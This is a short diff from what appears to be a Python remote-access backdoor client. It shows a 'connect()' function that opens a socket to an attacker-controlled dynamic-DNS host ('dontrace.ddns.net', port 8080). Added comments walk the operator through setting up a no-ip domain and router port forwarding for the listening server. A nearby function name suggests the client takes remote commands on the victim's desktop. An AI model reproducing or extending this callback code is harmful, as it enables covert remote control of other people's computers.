@@ -63,7 +63,12 @@ def change_desktop_bg(s,command):
 
         
 def connect():
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    #rmdomain is the freee dynamic domain name you created for your server it should be easy to configure it just download noip client 
+    #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
+    
     rmdomain='dontrace.ddns.net'
     rhost=socket.gethostbyname(rmdomain)
     s.connect((rhost, 8080))
